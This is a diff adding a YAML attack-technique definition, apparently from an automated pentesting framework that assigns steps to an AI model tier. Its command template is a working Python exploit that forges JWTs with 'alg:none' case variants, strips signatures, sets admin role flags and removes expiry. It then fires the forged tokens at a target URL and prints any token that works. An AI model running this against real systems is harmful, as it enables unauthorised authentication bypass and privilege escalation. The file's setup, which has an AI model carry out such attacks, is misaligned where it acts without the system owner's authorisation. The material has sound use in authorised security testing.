@@ -1,0 +1,87 @@
+name: jwt_sig_strip
+category: web
+description: JWT algorithm none / signature stripping — remove signature entirely
+preconditions:
+- auth_endpoint_known
+- jwt_token_found
+parameters:
+  target_url: from_engagement.target_url
+  token: from_finding.jwt_token
+command_template: >
+  python3 -c "
+  import json, base64, urllib.request, sys
+
+  token = '{token}'
+  target = '{target_url}'
+
+  parts = token.split('.')
+  if len(parts) != 3:
+      print('Invalid JWT'); sys.exit(1)
+
+  def b64d(s):
+      s += '=='*((4-len(s)%4)%4)
+      return base64.urlsafe_b64decode(s)
+  def b64e(b):
+      if isinstance(b, str): b = b.encode()
+      return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+
+  header = json.loads(b64d(parts[0]))
+  payload = json.loads(b64d(parts[1]))
+  print(f'Original alg: {header.get(\"alg\")}')
+  print(f'Original payload: {json.dumps(payload)[:200]}')
+
+  # Escalate privileges
+  payload['role'] = 'admin'
+  payload['admin'] = True
+  payload['is_admin'] = True
+  payload.pop('exp', None)  # Remove expiry
+
+  # Variants for alg:none bypass
+  alg_variants = ['none', 'None', 'NONE', 'nOnE', 'null', '']
+
+  results = []
+  for alg in alg_variants:
+      new_header = dict(header)
+      new_header['alg'] = alg
+      hdr_b64 = b64e(json.dumps(new_header, separators=(',',':')))
+      pay_b64 = b64e(json.dumps(payload, separators=(',',':')))
+
+      # Three forms: no sig, dot only, original sig with new header
+      for suffix in ['', '.', f'.{parts[2]}']:
+          forged = f'{hdr_b64}.{pay_b64}{suffix}'
+          try:
+              req = urllib.request.Request(target,
+                  headers={'Authorization': f'Bearer {forged}',
+                           'Cookie': f'token={forged}'})
+              with urllib.request.urlopen(req, timeout=8) as r:
+                  body = r.read().decode()[:200]
+                  print(f'[HIT] alg={alg!r} suffix={suffix!r}: HTTP {r.status}')
+                  print(f'  {body}')
+                  results.append(forged)
+          except urllib.error.HTTPError as e:
+              if e.code not in (401, 403):
+                  print(f'[?] alg={alg!r}: HTTP {e.code}')
+          except: pass
+
+  if results:
+      print(f'WORKING_TOKEN: {results[0]}')
+  else:
+      print('No alg:none bypass found — server likely validates algorithm')
+  "
+parser: web_response_parser
+expected_effects:
+- jwt_forged
+- auth_bypass_achieved
+falsifier:
+  pattern: 401|403|algorithm not allowed|Invalid alg
+  timeout: 60
+model_tier: haiku
+mechanism: >
+  Some JWT libraries accept alg='none' (no signature verification required). Try case variants
+  (None, NONE, nOnE) as some parsers case-insensitively match. Three suffix forms: no dot,
+  trailing dot only, original signature appended. Also try removing exp to bypass expiry.
+  Old jose/PyJWT <1.5 and node-jsonwebtoken <9 are vulnerable. Modern libs reject none by default
+  unless explicitly allowed. Tool: jwt_tool -X a
+hacktricks_ref: pentesting-web/hacking-jwt-json-web-tokens.md
+destructive: false
+opsec: low
